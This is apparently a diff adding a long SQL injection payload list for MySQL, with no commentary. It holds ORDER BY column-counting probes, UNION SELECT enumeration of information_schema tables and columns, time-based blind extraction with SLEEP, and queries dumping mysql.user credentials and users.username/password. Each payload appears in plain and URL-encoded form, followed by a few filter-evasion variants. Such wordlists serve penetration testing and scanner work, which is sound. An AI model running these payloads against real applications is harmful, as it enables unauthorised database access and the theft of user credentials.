@@ -1,3 +1,173 @@
+1' UNION SELECT IF(1=1,SLEEP(5),0)--+
+1' UNION SELECT IF(1=2,SLEEP(5),0)--+
+1' UNION SELECT IF(ASCII(SUBSTRING((SELECT user()),1,1))=114,SLEEP(5),0)--+
+1' UNION SELECT IF(ASCII(SUBSTRING((SELECT database()),1,1))=99,SLEEP(5),0)--+
+1' UNION SELECT IF(LENGTH(database())=5,SLEEP(5),0)--+
+1' UNION SELECT IF(version() like '%5%',SLEEP(5),0)--+
+1' UNION SELECT IF((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) like '%user%',SLEEP(5),0)--+
+1' UNION SELECT IF((SELECT COUNT(*) FROM users)>1,SLEEP(5),0)--+
+1' UNION SELECT IF((SELECT LENGTH(password) FROM users LIMIT 1)=32,SLEEP(5),0)--+
+1' UNION SELECT IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))=117,SLEEP(5),0)--+
+1' UNION SELECT 1,database(),3--+
+1' UNION SELECT NULL,database(),NULL--+
+1' UNION SELECT database(),2,3--+
+1' UNION SELECT 1,version(),3--+
+1' UNION SELECT NULL,version(),NULL--+
+1' UNION SELECT version(),2,3--+
+1' UNION SELECT 1,user(),3--+
+1' UNION SELECT NULL,user(),NULL--+
+1' UNION SELECT user(),2,3--+
+1' UNION SELECT 1,database(),version()--+
+1' UNION SELECT user,host FROM mysql.user--+
+1' UNION SELECT host,user FROM mysql.user--+
+1' UNION SELECT user,password FROM mysql.user--+
+1' UNION SELECT 1,user,host FROM mysql.user--+
+1' UNION SELECT NULL,user,password FROM mysql.user--+
+1' UNION SELECT user,host,NULL FROM mysql.user--+
+1' UNION SELECT user,NULL,password FROM mysql.user--+
+1' UNION SELECT NULL,user,NULL FROM mysql.user--+
+1' UNION SELECT user,2,3 FROM mysql.user--+
+1' UNION SELECT user(),database() FROM dual--+
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 4--+
+1' ORDER BY 5--+
+1' ORDER BY 6--+
+1' ORDER BY 7--+
+1' ORDER BY 8--+
+1' ORDER BY 9--+
+1' ORDER BY 10--+
+1' UNION SELECT 1,2,3--+
+1' UNION SELECT NULL,2,3--+
+1' UNION SELECT NULL,NULL,3--+
+1' UNION SELECT 1,NULL,NULL--+
+1' UNION SELECT 1,NULL,3--+
+1' UNION SELECT NULL,NULL,NULL--+
+1' UNION SELECT 1,2,NULL--+
+1' UNION SELECT 1,NULL,3--+
+1' UNION SELECT 1,2,NULL,NULL--+
+1' UNION SELECT 1,NULL,NULL,NULL--+
+1' UNION SELECT 1,table_name,3 FROM information_schema.tables--+
+1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--+
+1' UNION SELECT table_name,2,3 FROM information_schema.tables--+
+1' UNION SELECT 1,table_name,NULL FROM information_schema.tables--+
+1' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables--+
+1' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--+
+1' UNION SELECT NULL,table_name,3,NULL FROM information_schema.tables--+
+1' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--+
+1' UNION SELECT 1,2,table_name FROM information_schema.tables--+
+1' UNION SELECT NULL,NULL,table_name FROM information_schema.tables--+
+1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT NULL,column_name,3 FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT column_name,NULL,3 FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT 1,column_name,NULL FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT 1,column_name,3,NULL FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT NULL,column_name,3,4 FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'--+
+1' UNION SELECT 1,username,password FROM users--+
+1' UNION SELECT NULL,username,password FROM users--+
+1' UNION SELECT username,password,NULL FROM users--+
+1' UNION SELECT 1,username,NULL FROM users--+
+1' UNION SELECT NULL,username,NULL FROM users--+
+1' UNION SELECT username,NULL,password FROM users--+
+1' UNION SELECT 1,NULL,password FROM users--+
+1' UNION SELECT NULL,NULL,password FROM users--+
+1' UNION SELECT 1,username,NULL,NULL FROM users--+
+1' UNION SELECT NULL,username,password,NULL FROM users--+
+1%27%20UNION%20SELECT%201,%20username,%20password%20FROM%20users--+
+1%27%20UNION%20SELECT%20NULL,%20username,%20password%20FROM%20users--+
+1%27%20UNION%20SELECT%20username,%20password,%20NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%201,%20username,%20NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%20NULL,%20username,%20NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%20username,%20NULL,%20password%20FROM%20users--+
+1%27%20UNION%20SELECT%201,%20NULL,%20password%20FROM%20users--+
+1%27%20UNION%20SELECT%20NULL,%20NULL,%20password%20FROM%20users--+
+1%27%20UNION%20SELECT%201,%20username,%20NULL,%20NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%20NULL,%20username,%20password,%20NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%20IF(1=1,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF(1=2,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF(ASCII(SUBSTRING((SELECT%20user()),1,1))=114,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF(ASCII(SUBSTRING((SELECT%20database()),1,1))=99,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF(LENGTH(database())=5,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF(version()%20like%20%275%25%27,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%201)%20like%20%27%25user%25%27,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E1,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF((SELECT%20LENGTH(password)%20FROM%20users%20LIMIT%201)=32,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%20IF(ASCII(SUBSTRING((SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20LIMIT%201),1,1))=117,SLEEP(5),0)--+
+1%27%20UNION%20SELECT%201,database(),3--+
+1%27%20UNION%20SELECT%20NULL,database(),NULL--+
+1%27%20UNION%20SELECT%20database(),2,3--+
+1%27%20UNION%20SELECT%201,version(),3--+
+1%27%20UNION%20SELECT%20NULL,version(),NULL--+
+1%27%20UNION%20SELECT%20version(),2,3--+
+1%27%20UNION%20SELECT%201,user(),3--+
+1%27%20UNION%20SELECT%20NULL,user(),NULL--+
+1%27%20UNION%20SELECT%20user(),2,3--+
+1%27%20UNION%20SELECT%201,database(),version()--+
+1%27%20UNION%20SELECT%20user,host%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%20host,user%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%20user,password%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%201,user,host%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%20NULL,user,password%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%20user,host,NULL%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%20user,NULL,password%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%20NULL,user,NULL%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%20user,2,3%20FROM%20mysql.user--+
+1%27%20UNION%20SELECT%20user(),database()%20FROM%20dual--+
+1%27%20ORDER%20BY%201--+
+1%27%20ORDER%20BY%202--+
+1%27%20ORDER%20BY%203--+
+1%27%20ORDER%20BY%204--+
+1%27%20ORDER%20BY%205--+
+1%27%20ORDER%20BY%206--+
+1%27%20ORDER%20BY%207--+
+1%27%20ORDER%20BY%208--+
+1%27%20ORDER%20BY%209--+
+1%27%20ORDER%20BY%2010--+
+1%27%20UNION%20SELECT%201,2,3--+
+1%27%20UNION%20SELECT%20NULL,2,3--+
+1%27%20UNION%20SELECT%20NULL,NULL,3--+
+1%27%20UNION%20SELECT%201,NULL,NULL--+
+1%27%20UNION%20SELECT%201,NULL,3--+
+1%27%20UNION%20SELECT%20NULL,NULL,NULL--+
+1%27%20UNION%20SELECT%201,2,NULL--+
+1%27%20UNION%20SELECT%201,NULL,3--+
+1%27%20UNION%20SELECT%201,2,NULL,NULL--+
+1%27%20UNION%20SELECT%201,NULL,NULL,NULL--+
+1%27%20UNION%20SELECT%201,table_name,3%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%20NULL,table_name,NULL%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%20table_name,2,3%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%201,table_name,NULL%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%20NULL,table_name,NULL,NULL%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%201,table_name,3,4%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%20NULL,table_name,3,NULL%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%20table_name,NULL,NULL%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%201,2,table_name%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%20NULL,NULL,table_name%20FROM%20information_schema.tables--+
+1%27%20UNION%20SELECT%201,column_name,3%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%20NULL,column_name,3%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%20column_name,NULL,3%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%201,column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%20NULL,column_name,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%20column_name,2,3%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%201,column_name,3,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%20NULL,column_name,3,4%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%20column_name,NULL,NULL%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%201,2,column_name%20FROM%20information_schema.columns%20WHERE%20table_name=%27users%27--+
+1%27%20UNION%20SELECT%201,username,password%20FROM%20users--+
+1%27%20UNION%20SELECT%20NULL,username,password%20FROM%20users--+
+1%27%20UNION%20SELECT%20username,password,NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%201,username,NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%20NULL,username,NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%20username,NULL,password%20FROM%20users--+
+1%27%20UNION%20SELECT%201,NULL,password%20FROM%20users--+
+1%27%20UNION%20SELECT%20NULL,NULL,password%20FROM%20users--+
+1%27%20UNION%20SELECT%201,username,NULL,NULL%20FROM%20users--+
+1%27%20UNION%20SELECT%20NULL,username,password,NULL%20FROM%20users--+
 ` /!%55NiOn/ /!%53eLEct/
 %55nion(%53elect 1,2,3)– -
 +union+distinct+select+
